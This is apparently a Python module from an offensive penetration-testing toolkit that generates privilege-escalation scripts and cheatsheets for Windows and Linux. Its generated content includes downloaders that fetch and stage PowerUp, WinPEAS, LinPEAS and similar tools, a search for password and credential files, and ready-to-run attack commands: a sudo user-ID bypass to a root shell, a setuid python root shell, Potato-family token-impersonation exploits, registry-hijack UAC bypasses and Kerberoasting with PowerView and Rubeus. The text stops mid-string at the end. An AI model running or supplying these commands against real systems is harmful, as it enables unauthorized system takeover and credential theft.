"""
Privilege Escalation Module
Handles techniques for elevating privileges
"""

from pathlib import Path
import sys
from core.utils.output import print_colored

# Add configs directory to path for config import
TOOLKIT_DIR = Path(__file__).parent.parent.parent.absolute()
sys.path.insert(0, str(TOOLKIT_DIR / "configs"))

try:
    import config
except ImportError:
    # Fallback config values if import fails
    class config:
        pass

def run_privilege_escalation(target: str, tool_executor, toolkit_dir: Path, script_gen):
    """Execute privilege escalation phase"""
    print_colored(f"🔓 Running Privilege Escalation for: {target}", "GREEN", True)
    print()
    
    # Check current user privileges
    print_colored("🔍 Checking current user privileges...", "BLUE")
    result = tool_executor.execute_tool(
        "whoami",
        ["whoami", "/priv"],
        timeout=10
    )
    
    if result["success"]:
        print_colored("✅ Privilege check completed", "GREEN")
        print(result["output"])
    else:
        print_colored("❌ Failed to check privileges", "RED")
        print(result["error"])
    
    print()
    
    # Common privilege escalation techniques
    techniques = {
        "Windows": [
            "Check for unquoted service paths: wmic service get name,displayname,pathname,startmode",
            "Check privileges: whoami /priv",
            "Check for stored credentials: cmdkey /list",
            "Check scheduled tasks: schtasks /query /fo LIST /v"
        ],
        "Linux": [
            "Check sudo permissions: sudo -l",
            "Check for SUID binaries: find / -perm -4000 -type f 2>/dev/null",
            "Check for world-writable files: find / -type f -perm -o+w 2>/dev/null",
            "Check for cron jobs: crontab -l"
        ]
    }
    
    import platform
    os_type = platform.system()
    if os_type in techniques:
        print_colored(f"📋 {os_type} Privilege Escalation Techniques:", "BLUE")
        for cmd in techniques[os_type]:
            print(f"  • {cmd}")
    else:
        print_colored("❌ Unsupported OS for privilege escalation", "RED")
    
    # Generate PowerShell privilege escalation script for Windows
    if os_type == "Windows":
        ps_content = r'''# Windows Privilege Escalation Checks
Write-Host "=== System Information ===" -ForegroundColor Cyan
systeminfo

Write-Host "=== Current User Privileges ===" -ForegroundColor Cyan  
whoami /priv

Write-Host "=== Stored Credentials ===" -ForegroundColor Cyan
cmdkey /list

Write-Host "=== Unquoted Service Paths ===" -ForegroundColor Cyan
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows\\" | findstr /i /v """
'''

        script_path = script_gen.safe_write("windows_privesc.ps1", ps_content)
        if script_path:
            print_colored(f"📁 PowerShell script generated: {script_path}", "GREEN")
    
    # Generate Linux privilege escalation script
    elif os_type == "Linux":
        linux_content = '''#!/bin/bash
# Linux Privilege Escalation Checks

echo "=== System Information ==="
uname -a
cat /etc/issue
cat /proc/version

echo "=== Current User Info ==="
id
sudo -l

echo "=== SUID Binaries ==="
find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null

echo "=== World-Writable Files ==="
find / -writable -type f -not -path "*/proc/*" -not -path "*/sys/*" -not -path "*/dev/*" 2>/dev/null | head -n 50

echo "=== Interesting Files ==="
find / -name "*.conf" -o -name "*.config" -o -name "*password*" -o -name "*credential*" 2>/dev/null | grep -v "Permission denied" | head -n 50

echo "=== Cron Jobs ==="
ls -la /etc/cron*
cat /etc/crontab

echo "=== Running Processes ==="
ps aux | grep -i "root"

echo "=== Network Information ==="
ifconfig -a || ip a
netstat -antup || ss -tunlp

echo "=== Kernel Exploits Check ==="
echo "Kernel version: $(uname -r)"
'''
        script_path = script_gen.safe_write("linux_privesc.sh", linux_content, chmod_exec=True)
        if script_path:
            print_colored(f"📁 Linux privilege escalation script generated: {script_path}", "GREEN")
    
    # Generate generic privilege escalation cheatsheet
    cheatsheet_content = f'''# Privilege Escalation Cheatsheet for {target}

## Windows Techniques

### Services
- Check unquoted service paths: `wmic service get name,displayname,pathname,startmode`
- Check service permissions: `icacls "C:\path\to\service.exe"`
- Check AlwaysInstallElevated: `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`

### Registry
- Check for stored credentials: `cmdkey /list`
- Check AutoRun keys: `reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`

### Scheduled Tasks
- Check scheduled tasks: `schtasks /query /fo LIST /v`
- Look for custom tasks: `dir C:\Windows\Tasks`

### DLL Hijacking
- Check PATH directories for write permissions
- Look for applications missing DLLs: `procmon.exe`

## Linux Techniques

### Sudo
- Check sudo permissions: `sudo -l`
- Exploit sudo: `sudo -u#-1 /bin/bash`

### SUID Binaries
- Find SUID files: `find / -perm -4000 -type f 2>/dev/null`
- Common exploitable binaries: nano, vim, cp, find, bash

### Capabilities
- Check capabilities: `getcap -r / 2>/dev/null`
- Exploit capabilities: `./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'`

### Cron Jobs
- Check user crontabs: `crontab -l`
- Check system crontabs: `ls -la /etc/cron*`
- Look for writable scripts

### Kernel Exploits
- Check kernel version: `uname -a`
- Search for exploits: searchsploit linux kernel $(uname -r)
'''
    cheatsheet_path = script_gen.safe_write("privesc_cheatsheet.md", cheatsheet_content)
    if cheatsheet_path:
        print_colored(f"📁 Privilege escalation cheatsheet generated: {cheatsheet_path}", "CYAN")
    
    # Integrate advanced privilege escalation tools
    print_colored("\n🔍 Setting up advanced privilege escalation tools...", "BLUE")
    
    # Tool configuration - map tools to their download URLs and usage
    privesc_tools = {
        "Windows": {
            "PowerUp": {
                "url": "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1",
                "command": "powershell -ep bypass -c \"Import-Module .\\PowerUp.ps1; Invoke-AllChecks\"",
                "description": "PowerShell privilege escalation suite"
            },
            "SharpUp": {
                "url": "https://github.com/GhostPack/SharpUp/releases/latest/download/SharpUp.exe",
                "command": ".\\SharpUp.exe audit",
                "description": ".NET privilege escalation tool"
            },
            "WinPEAS": {
                "url": "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe",
                "command": ".\\winPEASany.exe",
                "description": "Windows Privilege Escalation Awesome Script"
            },
            "BeRoot": {
                "url": "https://github.com/AlessandroZ/BeRoot/releases/latest/download/beRoot.exe",
                "command": ".\\beRoot.exe",
                "description": "Windows privilege escalation scanning tool"
            }
        },
        "Linux": {
            "LinPEAS": {
                "url": "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh",
                "command": "chmod +x linpeas.sh && ./linpeas.sh",
                "description": "Linux Privilege Escalation Awesome Script"
            },
            "LinEnum": {
                "url": "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh",
                "command": "chmod +x LinEnum.sh && ./LinEnum.sh",
                "description": "Linux enumeration and privilege escalation script"
            },
            "pspy": {
                "url": "https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64",
                "command": "chmod +x pspy64 && ./pspy64",
                "description": "Process monitoring tool for privilege escalation"
            },
            "unix-privesc-check": {
                "url": "https://raw.githubusercontent.com/pentestmonkey/unix-privesc-check/master/unix-privesc-check",
                "command": "chmod +x unix-privesc-check && ./unix-privesc-check standard",
                "description": "Automated privilege escalation checks for Unix systems"
            }
        }
    }
    
    # Generate tool scripts based on OS type
    if os_type in privesc_tools:
        tools_content = f"# {os_type} Privilege Escalation Tools\n\n"
        tools_content += "This script will download and execute various privilege escalation tools.\n"
        tools_content += "Use with caution and only on systems you are authorized to test.\n\n"
        
        if os_type == "Windows":
            tools_content += "@echo off\n"
            tools_content += "echo Setting up Windows privilege escalation tools...\n\n"
            
            # Add PowerShell download commands for Windows tools
            tools_content += "REM Create tools directory\n"
            tools_content += "mkdir privesc_tools 2>nul\n"
            tools_content += "cd privesc_tools\n\n"
            
            for tool_name, tool_info in privesc_tools["Windows"].items():
                tools_content += f"echo Downloading {tool_name}...\n"
                tools_content += f"powershell -command \"(New-Object System.Net.WebClient).DownloadFile('{tool_info['url']}', '.\\{tool_name.lower()}.{tool_info['url'].split('.')[-1]}')\" || echo Failed to download {tool_name}\n"
                tools_content += f"echo Running {tool_name}...\n"
                tools_content += f"echo {tool_info['command']}\n"
                tools_content += f"REM {tool_info['command']}\n\n"
            
            # Add additional Windows-specific commands
            tools_content += "echo Performing additional Windows privilege escalation checks...\n"
            tools_content += "echo Checking for AlwaysInstallElevated registry key...\n"
            tools_content += "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n"
            tools_content += "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n\n"
            
            tools_content += "echo Checking for unattended install files...\n"
            tools_content += "dir /s C:\\Unattend.xml C:\\Windows\\Panther\\Unattend.xml C:\\Windows\\Panther\\Unattend\\Unattend.xml C:\\Windows\\system32\\sysprep.inf C:\\Windows\\system32\\sysprep\\sysprep.xml\n\n"
            
            tools_content += "echo Checking for Group Policy Preferences passwords...\n"
            tools_content += "dir /s C:\\Users\\All Users\\Microsoft\\Group Policy\\Groups\\*.xml\n\n"
            
            tools_content += "echo Checking for vulnerable services...\n"
            tools_content += "wmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"c:\\windows\\\\\"\n\n"
            
            # Metasploit-style exploit suggestions
            tools_content += "echo Available privilege escalation exploits:\n"
            tools_content += "echo 1. JuicyPotato - For Windows 7,8,10 and Server 2008,2012,2016 (before 2019)\n"
            tools_content += "echo 2. PrintSpoofer - For Windows 10 and Server 2016,2019\n"
            tools_content += "echo 3. RoguePotato - Alternative to JuicyPotato\n"
            tools_content += "echo 4. SweetPotato - PowerShell implementation of JuicyPotato\n\n"
            
            tools_content += "cd ..\n"
            tools_content += "echo Privilege escalation tools setup complete.\n"
            
            script_path = script_gen.safe_write("windows_privesc_tools.bat", tools_content)
            
        else:  # Linux
            tools_content += "#!/bin/bash\n"
            tools_content += "echo 'Setting up Linux privilege escalation tools...'\n\n"
            
            # Add wget/curl download commands for Linux tools
            tools_content += "# Create tools directory\n"
            tools_content += "mkdir -p privesc_tools\n"
            tools_content += "cd privesc_tools\n\n"
            
            for tool_name, tool_info in privesc_tools["Linux"].items():
                tools_content += f"echo 'Downloading {tool_name}...'\n"
                tools_content += f"if command -v curl >/dev/null 2>&1; then\n"
                tools_content += f"    curl -s -L '{tool_info['url']}' -o {tool_name.lower()} || echo 'Failed to download {tool_name}'\n"
                tools_content += f"elif command -v wget >/dev/null 2>&1; then\n"
                tools_content += f"    wget -q '{tool_info['url']}' -O {tool_name.lower()} || echo 'Failed to download {tool_name}'\n"
                tools_content += f"else\n"
                tools_content += f"    echo 'Neither curl nor wget found. Cannot download {tool_name}'\n"
                tools_content += f"fi\n\n"
                tools_content += f"echo 'Running {tool_name}...'\n"
                tools_content += f"echo '{tool_info['command']}'\n"
                tools_content += f"# {tool_info['command']}\n\n"
            
            # Add additional Linux-specific commands
            tools_content += "echo 'Performing additional Linux privilege escalation checks...'\n"
            tools_content += "echo 'Checking for SUID binaries...'\n"
            tools_content += "find / -perm -4000 -type f -exec ls -la {} \\; 2>/dev/null\n\n"
            
            tools_content += "echo 'Checking for writable /etc/passwd...'\n"
            tools_content += "ls -la /etc/passwd\n\n"
            
            tools_content += "echo 'Checking for readable shadow file...'\n"
            tools_content += "ls -la /etc/shadow\n\n"
            
            tools_content += "echo 'Checking for docker group...'\n"
            tools_content += "groups | grep docker\n\n"
            
            tools_content += "echo 'Checking for sudo permissions...'\n"
            tools_content += "sudo -l\n\n"
            
            tools_content += "echo 'Checking for custom kernel modules...'\n"
            tools_content += "lsmod\n\n"
            
            # Metasploit-style exploit suggestions
            tools_content += "echo 'Available privilege escalation exploits:'\n"
            tools_content += "echo '1. CVE-2021-4034 (PwnKit) - polkit pkexec Local Privilege Escalation'\n"
            tools_content += "echo '2. CVE-2021-3156 (Baron Samedit) - Sudo heap-based buffer overflow'\n"
            tools_content += "echo '3. CVE-2019-13272 - Linux kernel < 5.1.17 PTRACE_TRACEME local root'\n"
            tools_content += "echo '4. Dirty Pipe - CVE-2022-0847 - Linux kernel >= 5.8 local privilege escalation'\n\n"
            
            tools_content += "cd ..\n"
            tools_content += "echo 'Privilege escalation tools setup complete.'\n"
            
            script_path = script_gen.safe_write("linux_privesc_tools.sh", tools_content, chmod_exec=True)
            
        if script_path:
            print_colored(f"📁 {os_type} privilege escalation tools script generated: {script_path}", "GREEN")
            
    # Create advanced privilege escalation cheatsheet with real-world examples
    advanced_cheatsheet = f"""# Advanced Privilege Escalation Techniques for {target}

## Windows Advanced Techniques

### SeImpersonatePrivilege / SeAssignPrimaryToken Abuse
```powershell
# Check if the current user has impersonation privileges - key for token-based attacks
whoami /priv | findstr -i "Impersonate"

# JuicyPotato exploit - Works on Windows 7-10 and Server 2008-2016
# Creates a COM server with CLSID (*) to abuse SeImpersonatePrivilege
JuicyPotato.exe -l 1337 -p C:\\Windows\\System32\\cmd.exe -a "/c whoami > C:\\Users\\Public\\whoami.txt" -t *

# PrintSpoofer exploit - Works on Windows 10 and Server 2016-2019
# Exploits the Print Spooler service to achieve SYSTEM privileges
PrintSpoofer.exe -i -c "cmd /c whoami > C:\\Users\\Public\\whoami.txt"

# GodPotato - Latest potato exploit that works on Windows 11 and Server 2022
GodPotato.exe -cmd "cmd /c whoami > C:\\Users\\Public\\whoami.txt"
```

### UAC Bypass Techniques
```powershell
# UAC bypass via eventvwr.exe - Exploits registry autorun
# Works by hijacking the mscfile handler in the registry
New-Item -Path "HKCU:\\Software\\Classes\\mscfile\\shell\\open\\command" -Value "C:\\Users\\Public\\payload.exe" -Force
Start-Process eventvwr.exe

# UAC bypass via fodhelper.exe - Works on Windows 10/11
# Exploits the ms-settings handler for privilege escalation
New-Item -Path "HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command" -Value "C:\\Users\\Public\\payload.exe" -Force
Start-Process fodhelper.exe

# UAC bypass via sdclt.exe - Windows 10 backup utility
New-Item -Path "HKCU:\\Software\\Classes\\Folder\\shell\\open\\command" -Value "$env:PAYLOAD_PATH" -Force
Start-Process sdclt.exe
```

### Kerberoasting
```powershell
# Enumerate Service Principal Names (SPNs) in Active Directory
# SPNs are accounts associated with services like SQL, IIS, etc.
setspn -T $env:DOMAIN_NAME -Q */*

# Extract Kerberos service tickets using PowerView
# These can be cracked offline to reveal service account passwords
Import-Module $env:TOOL_PATH\\PowerView.ps1
Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat Hashcat | Export-Csv $env:OUTPUT_DIR\\tickets.csv -NoTypeInformation

# Alternative method using Rubeus
& "$env:TOOL_PATH\\Rubeus.exe" kerberoast /outfile:$env:OUTPUT_DIR\\hashes.txt
```

### Unquoted Service Paths
```powershell
# Find services with unquoted paths containing spaces
# Windows will try multiple paths when spaces exist without quotes
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "%SYSTEMROOT%" | findstr /i /v """

